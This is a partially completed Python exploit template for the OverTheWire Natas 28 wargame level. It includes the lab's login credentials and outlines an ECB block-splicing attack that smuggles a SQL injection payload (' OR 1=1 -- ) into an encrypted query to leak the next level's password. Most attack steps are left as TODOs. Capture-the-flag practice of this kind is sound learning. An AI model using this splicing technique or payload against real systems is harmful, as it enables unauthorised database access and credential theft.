import requests
import base64
from urllib.parse import quote, unquote

# Target credentials and URL
URL = "http://natas28.natas.labs.overthewire.org/index.php"
AUTH = ('natas28', 'Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3')

BLOCK_SIZE = 16

def get_raw_ciphertext(input_str):
    """
    Helper function to send a search query and return the RAW BINARY 
    ciphertext bytes (decoding from URL and Base64 encoding).
    """
    response = requests.post(URL, data={'query': input_str}, auth=AUTH)
    
    # Extract the encrypted query string from the redirected response URL
    if 'query=' in response.url:
        encoded_ct = response.url.split('query=')[1]
        raw_bytes = base64.b64decode(unquote(encoded_ct))
        return raw_bytes
    else:
        print("[!] Error: Could not extract query parameter from response.")
        return None

def send_spliced_ciphertext(raw_bytes):
    """
    Helper function to re-encode spliced raw ciphertext bytes back into 
    URL/Base64 format and send it to the server to trigger the SQL injection.
    """
    b64_ct = base64.b64encode(raw_bytes).decode('utf-8')
    url_encoded_ct = quote(b64_ct)
    
    target_url = f"{URL}?query={url_encoded_ct}"
    response = requests.get(target_url, auth=AUTH)
    return response.text

def main():
    print("[*] Starting Natas 28 Exploit Script...")

    # =========================================================================
    # STEP 1: CALCULATE THE PREFIX OFFSET
    # -------------------------------------------------------------------------
    # Main Idea: 
    # Send inputs of increasing length (e.g., 'A'*1, 'A'*2, 'A'*3...) until 
    # the total ciphertext byte length increases by 16 bytes.
    # This reveals how many padding characters are needed to completely fill 
    # the server's static prefix block and align your input to a fresh block boundary.
    # =========================================================================
    
    # TODO: Determine prefix_padding_len
    prefix_padding_len = 0  # <--- Replace with calculated padding length


    # =========================================================================
    # STEP 2: CRAFT AND HARVEST THE ENCRYPTED PAYLOAD BLOCK
    # -------------------------------------------------------------------------
    # Main Idea:
    # Construct a query string:
    #   [Prefix Padding] + [SQL Injection Payload] + [Suffix Padding]
    #
    # Send this to the server and extract ONLY the 16-byte block(s) that 
    # contain your encrypted SQL payload.
    # =========================================================================
    
    # TODO: Define your target SQL payload (e.g., ' UNION SELECT ... -- ')
    sql_payload = " ' OR 1=1 -- " 
    
    # TODO: Pad the payload so it fills an exact multiple of 16 bytes
    crafted_input = "A" * prefix_padding_len + sql_payload
    
    # raw_ct_A = get_raw_ciphertext(crafted_input)
    # TODO: Slice out the exact 16-byte block corresponding to your payload
    # payload_block = raw_ct_A[start_idx : end_idx]


    # =========================================================================
    # STEP 3: SPLICE THE PAYLOAD INTO A BASELINE CIPHERTEXT
    # -------------------------------------------------------------------------
    # Main Idea:
    # Obtain a normal ciphertext string (Request B). Splice your harvested 
    # encrypted payload block into the raw bytes where the backend expects 
    # search parameter data.
    # =========================================================================
    
    # baseline_ct = get_raw_ciphertext("benign_search_term")
    # TODO: Reconstruct the raw byte array:
    # spliced_bytes = baseline_prefix_blocks + payload_block + baseline_suffix_blocks


    # =========================================================================
    # STEP 4: EXECUTE THE INJECTION & READ THE PASSWORD
    # -------------------------------------------------------------------------
    # Main Idea:
    # Send the modified, re-encoded ciphertext back to the server and parse 
    # the HTML response for the leaked natas29 password.
    # =========================================================================
    
    # result_html = send_spliced_ciphertext(spliced_bytes)
    # print(result_html)

if __name__ == "__main__":
    main()